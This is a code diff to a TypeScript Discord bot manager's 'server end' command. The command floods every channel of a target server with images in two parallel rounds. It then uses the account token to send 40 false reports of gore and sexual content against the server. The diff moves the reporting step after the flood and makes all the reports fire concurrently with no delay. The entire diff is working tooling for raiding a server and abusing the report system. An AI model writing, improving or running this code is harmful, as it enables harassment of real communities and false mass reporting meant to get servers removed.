@@ -4153,110 +4153,10 @@ export class BotManager {
                 `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END INITIATED\u001b[0m\n` +
                 `\u001b[1;33mTarget:\u001b[0m ${targetGuild.name} (${targetGuildId})\n` +
                 `\u001b[1;33mChannels:\u001b[0m ${channels.length}\n` +
-                `\u001b[1;33mStep 1/3:\u001b[0m Reporting server...\u001b[0m\n\`\`\``
+                `\u001b[1;33mStep 1/3:\u001b[0m Flooding channels (Round 1)...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
-            // ── Report the server for both categories ─────────────────────────
-            const token = (client as any).token;
-            const reportHeaders: Record<string, string> = {
-                'Authorization': token,
-                'Content-Type': 'application/json',
-                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
-                'X-Discord-Locale': 'en-US',
-                'X-Discord-Timezone': 'America/New_York',
-            };
-
-            // Walk node tree to find breadcrumbs matching a set of keywords
-            const buildBreadcrumbs = (nodes: Record<number, any>, rootId: number, keywords: string[]): number[] => {
-                const path: number[] = [];
-                let currentId: number = rootId;
-                for (let depth = 0; depth < 15; depth++) {
-                    const node = nodes[currentId];
-                    if (!node) break;
-                    path.push(currentId);
-                    if (node.button?.type === 'submit' || node.is_auto_submit) break;
-                    const children: Array<{ name: string; target_node_id: number }> = node.children || [];
-                    if (children.length === 0) break;
-                    const match = children.find((c) => {
-                        const n = (c.name || '').toLowerCase();
-                        return keywords.some(kw => n.includes(kw));
-                    });
-                    currentId = match ? match.target_node_id : children[0].target_node_id;
-                }
-                return path;
-            };
-
-            // Fetch the report menu once and derive both breadcrumb paths
-            let goreBreadcrumbs: number[] = [];
-            let sexualBreadcrumbs: number[] = [];
-            let menuVariant = '3';
-            try {
-                const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/guild', { headers: reportHeaders });
-                if (menuRes.ok) {
-                    const menu = await menuRes.json() as any;
-                    menuVariant = String(menu.variant || '3');
-                    const nodes: Record<number, any> = menu.nodes || {};
-                    const rootId: number = menu.root_node_id;
-                    goreBreadcrumbs   = buildBreadcrumbs(nodes, rootId, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent']);
-                    sexualBreadcrumbs = buildBreadcrumbs(nodes, rootId, ['sexual', 'explicit', 'graphic', 'unwanted sexual']);
-                }
-            } catch { /* menu fetch failed — will use v1 fallback */ }
-
-            // Helper: send N reports using a specific breadcrumb path / v1 reason code
-            const sendReports = async (breadcrumbs: number[], v1Reason: number, count: number): Promise<{ success: number; failed: number }> => {
-                let success = 0; let failed = 0;
-                for (let i = 0; i < count; i++) {
-                    let sent = false;
-                    if (breadcrumbs.length > 0) {
-                        try {
-                            const res = await fetch('https://discord.com/api/v9/reporting/guild', {
-                                method: 'POST',
-                                headers: reportHeaders,
-                                body: JSON.stringify({
-                                    version: '1.0',
-                                    variant: menuVariant,
-                                    name: 'guild',
-                                    language: 'en',
-                                    breadcrumbs,
-                                    guild_id: targetGuildId,
-                                }),
-                            });
-                            if (res.status === 201 || res.ok) { success++; sent = true; }
-                        } catch { /* fall through */ }
-                    }
-                    if (!sent) {
-                        try {
-                            const res = await fetch('https://discord.com/api/v9/report', {
-                                method: 'POST',
-                                headers: reportHeaders,
-                                body: JSON.stringify({ guild_id: targetGuildId, channel_id: null, message_id: null, reason: v1Reason }),
-                            });
-                            if (res.ok || res.status === 201 || res.status === 204) { success++; } else { failed++; }
-                        } catch { failed++; }
-                    }
-                    await new Promise(r => setTimeout(r, 600));
-                }
-                return { success, failed };
-            };
-
-            // Report 1: gore / violent shock content (v1 reason 8 = harmful/dangerous)
-            const goreResult = await sendReports(goreBreadcrumbs, 8, 20);
-            // Report 2: explicit / sexual content (v1 reason 5 = explicit content)
-            const sexualResult = await sendReports(sexualBreadcrumbs, 5, 20);
-
-            const totalSuccess = goreResult.success + sexualResult.success;
-            const totalFailed  = goreResult.failed  + sexualResult.failed;
-
-            await message.edit(
-                `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — REPORTING\u001b[0m\n` +
-                `\u001b[1;33mGore / Violent Shock:\u001b[0m   ${goreResult.success}/20 sent\n` +
-                `\u001b[1;33mExplicit / Sexual:\u001b[0m      ${sexualResult.success}/20 sent\n` +
-                `\u001b[1;33mTotal Reports:\u001b[0m ${totalSuccess}/40${totalFailed > 0 ? `  \u001b[1;31m(${totalFailed} failed)\u001b[0m` : ''}\n` +
-                `\u001b[1;33mStep 2/3:\u001b[0m Flooding channels (Round 1)...\u001b[0m\n\`\`\``
-            ).catch(() => {});
-
-            // ── Flood channels — track real send stats ────────────────────────
-            // Returns { sent, failed, stopped } for one channel across all images
+            // ── STEP 1 & 2: Flood channels ────────────────────────────────────
             const floodChannel = async (ch: any): Promise<{ sent: number; failed: number; name: string; stopped: boolean }> => {
                 let sent = 0; let failed = 0;
                 for (const url of SERVER_END_IMAGES) {
@@ -4268,7 +4168,7 @@ export class BotManager {
 
             const startFlood = Date.now();
 
-            // Round 1
+            // Round 1 — all channels in parallel
             const round1Results = await Promise.allSettled(channels.map(ch => floodChannel(ch)));
             let r1Sent = 0; let r1Failed = 0; let r1ChannelsHit = 0;
             for (const r of round1Results) {
@@ -4285,7 +4185,6 @@ export class BotManager {
                 await message.edit(
                     `\`\`\`ansi\n\u001b[1;33m[!] SERVER END CANCELLED (after Round 1)\u001b[0m\n` +
                     `\u001b[1;33mGuild:\u001b[0m ${targetGuild.name}\n` +
-                    `\u001b[1;33mReports sent:\u001b[0m ${totalSuccess}/40\n` +
                     `\u001b[1;33mRound 1 images sent:\u001b[0m ${r1Sent} across ${r1ChannelsHit} channels\n` +
                     `\u001b[1;33mElapsed:\u001b[0m ${elapsed1}s\u001b[0m\n\`\`\``
                 ).catch(() => {});
@@ -4294,11 +4193,11 @@ export class BotManager {
 
             await message.edit(
                 `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — FLOODING\u001b[0m\n` +
-                `\u001b[1;33mRound 1:\u001b[0m ${r1Sent} images sent across ${r1ChannelsHit} channels\n` +
-                `\u001b[1;33mStep 3/3:\u001b[0m Round 2 firing...\u001b[0m\n\`\`\``
+                `\u001b[1;33mRound 1:\u001b[0m ${r1Sent} imgs across ${r1ChannelsHit} channels\n` +
+                `\u001b[1;33mStep 2/3:\u001b[0m Round 2 firing...\u001b[0m\n\`\`\``
             ).catch(() => {});
 
-            // Round 2 — no delay, fire immediately
+            // Round 2 — immediate, no delay
             const round2Results = await Promise.allSettled(channels.map(ch => floodChannel(ch)));
             let r2Sent = 0; let r2Failed = 0; let r2ChannelsHit = 0;
             for (const r of round2Results) {
@@ -4309,10 +4208,95 @@ export class BotManager {
                 } else { r2Failed += SERVER_END_IMAGES.length; }
             }
 
+            const floodElapsed = ((Date.now() - startFlood) / 1000).toFixed(1);
+            const wasStopped = !activeServerEnds.get(configId);
+
+            await message.edit(
+                `\`\`\`ansi\n\u001b[1;31m[NETRUNNER] SERVER END — REPORTING\u001b[0m\n` +
+                `\u001b[1;33mRound 1:\u001b[0m ${r1Sent} imgs  \u001b[1;33mRound 2:\u001b[0m ${r2Sent} imgs\n` +
+                `\u001b[1;33mStep 3/3:\u001b[0m Sending reports...\u001b[0m\n\`\`\``
+            ).catch(() => {});
+
+            // ── STEP 3: Report the server for both categories — fast (no extra delay) ──
+            const token = (client as any).token;
+            const reportHeaders: Record<string, string> = {
+                'Authorization': token,
+                'Content-Type': 'application/json',
+                'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36',
+                'X-Discord-Locale': 'en-US',
+                'X-Discord-Timezone': 'America/New_York',
+            };
+
+            const buildBreadcrumbs = (nodes: Record<number, any>, rootId: number, keywords: string[]): number[] => {
+                const path: number[] = [];
+                let currentId: number = rootId;
+                for (let depth = 0; depth < 15; depth++) {
+                    const node = nodes[currentId];
+                    if (!node) break;
+                    path.push(currentId);
+                    if (node.button?.type === 'submit' || node.is_auto_submit) break;
+                    const children: Array<{ name: string; target_node_id: number }> = node.children || [];
+                    if (children.length === 0) break;
+                    const match = children.find((c) => keywords.some(kw => (c.name || '').toLowerCase().includes(kw)));
+                    currentId = match ? match.target_node_id : children[0].target_node_id;
+                }
+                return path;
+            };
+
+            let goreBreadcrumbs: number[] = [];
+            let sexualBreadcrumbs: number[] = [];
+            let menuVariant = '3';
+            try {
+                const menuRes = await fetch('https://discord.com/api/v9/reporting/menu/guild', { headers: reportHeaders });
+                if (menuRes.ok) {
+                    const menu = await menuRes.json() as any;
+                    menuVariant = String(menu.variant || '3');
+                    const nodes: Record<number, any> = menu.nodes || {};
+                    const rootId: number = menu.root_node_id;
+                    goreBreadcrumbs   = buildBreadcrumbs(nodes, rootId, ['gore', 'animal cruelty', 'violent shock', 'shock content', 'violent']);
+                    sexualBreadcrumbs = buildBreadcrumbs(nodes, rootId, ['sexual', 'explicit', 'graphic', 'unwanted sexual']);
+                }
+            } catch { /* fallback to v1 */ }
+
+            // Fire a single report attempt — no per-report delay, as fast as possible
+            const sendOneReport = async (breadcrumbs: number[], v1Reason: number): Promise<boolean> => {
+                if (breadcrumbs.length > 0) {
+                    try {
+                        const res = await fetch('https://discord.com/api/v9/reporting/guild', {
+                            method: 'POST',
+                            headers: reportHeaders,
+                            body: JSON.stringify({ version: '1.0', variant: menuVariant, name: 'guild', language: 'en', breadcrumbs, guild_id: targetGuildId }),
+                        });
+                        if (res.status === 201 || res.ok) return true;
+                    } catch { /* fall through */ }
+                }
+                try {
+                    const res = await fetch('https://discord.com/api/v9/report', {
+                        method: 'POST',
+                        headers: reportHeaders,
+                        body: JSON.stringify({ guild_id: targetGuildId, channel_id: null, message_id: null, reason: v1Reason }),
+                    });
+                    return res.ok || res.status === 201 || res.status === 204;
+                } catch { return false; }
+            };
+
+            // Send all 40 reports as fast as possible — both categories fire concurrently
+            const gorePromises   = Array.from({ length: 20 }, () => sendOneReport(goreBreadcrumbs, 8));
+            const sexualPromises = Array.from({ length: 20 }, () => sendOneReport(sexualBreadcrumbs, 5));
+            const [goreResults, sexualResults] = await Promise.all([
+                Promise.all(gorePromises),
+                Promise.all(sexualPromises),
+            ]);
+
+            const goreSuccess   = goreResults.filter(Boolean).length;
+            const goreFailed    = 20 - goreSuccess;
+            const sexualSuccess = sexualResults.filter(Boolean).length;
+            const sexualFailed  = 20 - sexualSuccess;
+            const totalSuccess  = goreSuccess + sexualSuccess;
+            const totalFailed   = goreFailed + sexualFailed;
+
             activeServerEnds.set(configId, false);
 
-            const wasStopped = r2Sent + r2Failed < channels.length * SERVER_END_IMAGES.length;
-            const elapsed = ((Date.now() - startFlood) / 1000).toFixed(1);
             const totalImgSent   = r1Sent + r2Sent;
             const totalImgFailed = r1Failed + r2Failed;
             const totalAttempted = channels.length * SERVER_END_IMAGES.length * 2;
@@ -4333,18 +4317,18 @@ export class BotManager {
             summary += `  Guild Name : ${targetGuild.name}\n`;
             summary += `  Guild ID   : ${targetGuildId}\n`;
             summary += `${DIM}${BAR}${RST}\n`;
-            summary += `${YLW}REPORTS${RST}\n`;
-            summary += `  Gore / Violent Shock  : ${goreResult.success > 0 ? GRN : RED}${goreResult.success}/20${RST}${goreResult.failed > 0 ? ` ${RED}(${goreResult.failed} failed)${RST}` : ''}\n`;
-            summary += `  Explicit / Sexual      : ${sexualResult.success > 0 ? GRN : RED}${sexualResult.success}/20${RST}${sexualResult.failed > 0 ? ` ${RED}(${sexualResult.failed} failed)${RST}` : ''}\n`;
-            summary += `  Total Reports Sent     : ${GRN}${totalSuccess}/40${RST}\n`;
-            summary += `${DIM}${BAR}${RST}\n`;
             summary += `${YLW}FLOOD${RST}\n`;
             summary += `  Channels Found         : ${channels.length}\n`;
             summary += `  Round 1 — Channels Hit : ${r1ChannelsHit}/${channels.length}  (${r1Sent} imgs)\n`;
             summary += `  Round 2 — Channels Hit : ${r2ChannelsHit}/${channels.length}  (${r2Sent} imgs)\n`;
             summary += `  Images Sent            : ${GRN}${totalImgSent}${RST} / ${totalAttempted} attempted\n`;
             if (totalImgFailed > 0) summary += `  Images Failed          : ${RED}${totalImgFailed}${RST}\n`;
-            summary += `  Elapsed (flood)        : ${elapsed}s\n`;
+            summary += `  Flood Time             : ${floodElapsed}s\n`;
+            summary += `${DIM}${BAR}${RST}\n`;
+            summary += `${YLW}REPORTS${RST}\n`;
+            summary += `  Gore / Violent Shock  : ${goreSuccess > 0 ? GRN : RED}${goreSuccess}/20${RST}${goreFailed > 0 ? ` ${RED}(${goreFailed} failed)${RST}` : ''}\n`;
+            summary += `  Explicit / Sexual      : ${sexualSuccess > 0 ? GRN : RED}${sexualSuccess}/20${RST}${sexualFailed > 0 ? ` ${RED}(${sexualFailed} failed)${RST}` : ''}\n`;
+            summary += `  Total Reports Sent     : ${GRN}${totalSuccess}/40${RST}${totalFailed > 0 ? `  ${RED}(${totalFailed} failed)${RST}` : ''}\n`;
             summary += `${DIM}${BAR}${RST}\n`;
             summary += wasStopped
                 ? `${YLW}[!] STOPPED EARLY BY USER${RST}\n`
